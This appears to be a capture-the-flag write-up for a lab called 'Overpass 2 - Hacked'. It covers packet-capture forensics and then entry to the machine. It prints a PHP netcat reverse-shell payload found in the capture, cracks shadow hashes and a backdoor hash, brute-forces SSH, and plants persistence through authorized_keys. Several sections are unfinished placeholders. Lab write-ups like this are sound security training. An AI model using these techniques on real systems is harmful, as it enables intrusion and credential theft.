# Overpass 2 - Hacked
## Table of Contents
* [PCAP Analysis](#pcap-analysis)
* [File Analysis](#file-analysis)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
  * [Web Browsing](#web-browsing)
  * [Web Crawling](#web-crawling)
  * [Vulnerability Scanning](#vulnerability-scanning)
* [Exploit](#exploit)
  * [Password Guessing](#password-guessing)
  * [Local File Inclusion](#local-file-inclusion)
* [Explore](#explore)
* [Escalate](#escalate)

## PCAP Analysis
Used the Wireshark network protocol analyzer to open and parse the provided file. 
```bash
wireshark overpass2.pcapng
```

Wireshark 
* Edit > Preferences > Appearance > Layout
  * Pane 1: Packet List
  * Pane 2: Packet Details
  * Pane 3: Packet Bytes
* Edit > Preferences > Appearance > Columns
  * Add "Source port"
  * Add "Destination port"
  * Change the Time column Type value to "UTC date, as YYYY-MM-DD, and Time"
* Statistics > Endpoints
  * Local network: 192.168.170.0
  * Remote nodes: 
    * 91.189.91.157
    * 140.82.118.4
* Statistics > Conversations > TCP 
    * 192.168.170.159 -> 140.82.118.4
    * 192.168.170.145 -> 192.168.170.159
    * 192.168.170.159 -> 192.168.170.145
    * 192.168.170.145 -> 192.168.170.159
* Statistics > Protocol Hierarchy
  * TCP: 20 percent
    * HTTP: 8.6 percent
    * TLS: 8.6 percent
  * UDP: 40 percent
* Display Filters
  * http.request.method == "POST"
    * Frame 14, "/development/upload.php"
  * frame contains "password"
    * Frame 99, "[sudo] password for james:"
     * Go > Go to packet: 99
       * Frame 101 contained the string "whenevernoteartinstant"
  * frame contains "https://"
    * Frame 120, "https://github.com/NinjaJc01/ssh-backdoor"
  * frame contains "shadow"
    * Frame 112, "sudo cat /etc/shadow"
* Frame 112 > Follow > TCP Stream

Frame 112 TCP stream.
```bash
# i copied and pasted the data below to a file called 'hashes.txt'
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

## File Analysis
Wireshark 
* File > Export Objects > HTTP > Save All

Files exported from the PCAP by Wireshark are below. 
```bash
ls -al | awk '{print $9}'

# output
%2f
cooctus(1).png
cooctus.png
development
index.html
upload(1).php
upload.php
uploads
```

Frame 14 payload. 
```bash
cat upload.php

# output
-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--

# payload within the file
exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")
```

### Password Guessing
I wrote a script to recreate the /etc/passwd file that corresponds with the exfiltrated /etc/shadow file (see below).
```bash
#/usr/bin/bash

SHADOWFILE=$1
while read LINE; do
    NAME=$(echo $LINE | cut -d: -f1)
    HASH=$(echo $LINE | cut -d: -f2)
    echo "$NAME:$HASH::0:0:$NAME:/home/$NAME:/bin/bash"
done < $SHADOWFILE
```

moonshadow.sh script. 
```bash
./moonshadow.sh shadow.txt > passwd.txt
cat passwd.txt

# output
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/::0:0:james:/home/james:/bin/bash
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0::0:0:paradox:/home/paradox:/bin/bash
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/::0:0:szymex:/home/szymex:/bin/bash
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0::0:0:bee:/home/bee:/bin/bash
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.::0:0:muirland:/home/muirland:/bin/bash

unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt

# output
paradox:secuirty3::0:0:paradox:/home/paradox:/bin/bash
szymex:abcd123::0:0:szymex:/home/szymex:/bin/bash
bee:secret12::0:0:bee:/home/bee:/bin/bash
muirland:1qaz2wsx::0:0:muirland:/home/muirland:/bin/bash

4 password hashes cracked, 1 left
```

ssh-backdoor GitHub repository. The file "main.go" contained the default hash and hardcoded salt for the backdoor.   
```bash
git clone https://github.com/NinjaJc01/ssh-backdoor
cd ssh-backdoor
cat main.go

# default hash (password) for the backdoor
# var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"

# hardcoded salt for the backdoor (specified within the "passwordHandler function")
# verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)

# hashed used within PCAP (found by first using this display filter: 'frame contains "backdoor"' and then, following TCP stream 3)
# backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

```bash
echo '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed' > hash.txt
awk '{print length}' hash.txt

# output
128 # SHA512 is 128 characters long
```

Cracking the hash used by the hacker (password = november16). First, I had to assemble the hash and salt (delimited by a colon) like this = hash:salt. The mode 1710 represents SHA512. 
```bash
hashcat -m 1710 -a 0 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05 /usr/share/wordlists/rockyou.txt 

# output
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-8100 CPU @ 3.60GHz, 5847/5911 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512($pass.$salt)
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Tue Apr 13 21:35:11 2021 (0 secs)
Time.Estimated...: Tue Apr 13 21:35:11 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   140.7 kH/s (0.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 18432/14344385 (0.13%)
Rejected.........: 0/18432 (0.00%)
Restore.Point....: 16384/14344385 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: christal -> tanika

Started: Tue Apr 13 21:34:07 2021
Stopped: Tue Apr 13 21:35:13 2021
```

## Enumerate
### Ports
An initial Nmap port scan discovered TCP ports 22, 80, and 2222 were open.
```bash
sudo nmap 10.10.218.92 -sS -sU --min-rate 1000 -oA Overpass-OpenPorts-Initial

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 21:46 MDT
Nmap scan report for 10.10.218.92
Host is up (0.21s latency).
Not shown: 1005 closed ports, 992 open|filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 5.16 seconds
```

A scan of all TCP and UDP ports did not produce any additional information. 
```bash
sudo nmap 10.10.218.92 -sS -sU -p- --min-rate 1000 -oA Overpass-OpenPorts-All
```

### Services
Nmap determined the target is running the following service versions:
* foo
* bar

```bash
sudo nmap 10.10.22.113 -sS -sU -p T:22,80,3306,U:68 -sV -oA Overpass-ServiceVersions

# output
# code goes here
```

### Web Browsing
```bash
# code goes here
```

### Web Crawling
Dirsearch discovered several web files and directories of interest. 
```bash
git clone https://github.com/maurosoria/dirsearch
python3 dirsearch/dirsearch.py -u 10.10.22.113 --simple-report Overpass-WebCrawl.txt

# output
```

### Vulnerability Scanning
```
# code goes here
```

## Exploit
```bash
# code goes here
```

### Password Guessing
Attempted to login via SSH, no dice. 
```bash
ssh james@10.10.22.113
# Permission denied, please try again.

ssh paradox@10.10.22.113
# Permission denied, please try again.

ssh szymex@10.10.22.113
# Permission denied, please try again.

ssh bee@10.10.22.113
# Permission denied, please try again.

ssh muirland@10.10.22.113
# Permission denied, please try again.
```

Attempted to brute-force my way in to identify james's password, no dice. 
```bash
hydra -l james -P /usr/share/wordlists/fasttrack.txt 10.10.62.200 -t4 ssh -s 22
hydra -l root -P /usr/share/wordlists/fasttrack.txt 10.10.62.200 -t4 ssh -s 22
```

Attempted to connect to the hacker's backdoor.
```bash
nc 10.10.22.113 2222 # did not work

ssh -p2222 10.10.226.36 # worked using 'november16' as the password

# output
The authenticity of host '[10.10.226.36]:2222 ([10.10.226.36]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.226.36]:2222' (RSA) to the list of known hosts.
victor@10.10.226.36's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ 
```

## Explore
Identifying the kernel version. 
```bash
uname -a

# output
Linux overpass-production 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
find / -type f -mtime -15 2> /dev/null | grep -v "/proc" | grep -v "/sys/" | grep -v "/var/lib" | grep -v "/run/"

# output
/boot/grub/grubenv
/home/james/.gnupg/pubring.kbx
/home/james/.gnupg/trustdb.gpg
/var/cache/motd-news
/var/cache/apt/pkgcache.bin
/var/cache/apt/srcpkgcache.bin
/var/log/cloud-init.log
/var/log/apache2/error.log
/var/log/cloud-init-output.log
/var/log/kern.log
/var/log/unattended-upgrades/unattended-upgrades.log
/var/log/wtmp
/var/log/auth.log
/var/log/syslog
/var/log/journal/3f5f374267de4d8e9fadc57d837132c9/system@e560939c609148a5a3bf757d7d7f0787-00000000000024ca-0005bff79c7eb4a9.journal
/var/log/journal/3f5f374267de4d8e9fadc57d837132c9/user-1000@468643f90acc410ab5d93aa8ef47f935-00000000000007b3-0005aae8d1be9e1b.journal
/var/log/journal/3f5f374267de4d8e9fadc57d837132c9/user-1000.journal
/var/log/journal/3f5f374267de4d8e9fadc57d837132c9/system.journal
/var/log/journal/3f5f374267de4d8e9fadc57d837132c9/system@e560939c609148a5a3bf757d7d7f0787-0000000000000001-0005aae8c8c2eaa7.journal
```

Confirmed all user passwords were changed.
```bash
cat /var/log/auth.log

# output 
Jul 21 20:54:24 overpass-production passwd[3365]: pam_unix(passwd:chauthtok): password changed for bee
Jul 21 20:54:43 overpass-production passwd[3367]: pam_unix(passwd:chauthtok): password changed for muirland
Jul 21 20:54:48 overpass-production passwd[3368]: pam_unix(passwd:chauthtok): password changed for james
Jul 21 20:54:58 overpass-production passwd[3370]: pam_unix(passwd:chauthtok): password changed for szymex
Jul 21 20:55:04 overpass-production passwd[3372]: pam_unix(passwd:chauthtok): password changed for paradox
```

## Escalate
```bash
# on the attacker side
cd /home/victor/.ssh
ssh-keygen
cat id_rsa.pub # copy the output to memory

# on the victim side
cd /home/james/.ssh
vim authorized_keys # copy and paste your id_rsa.pub key

# on the attacker side
ssh james@10.10.62.200
```
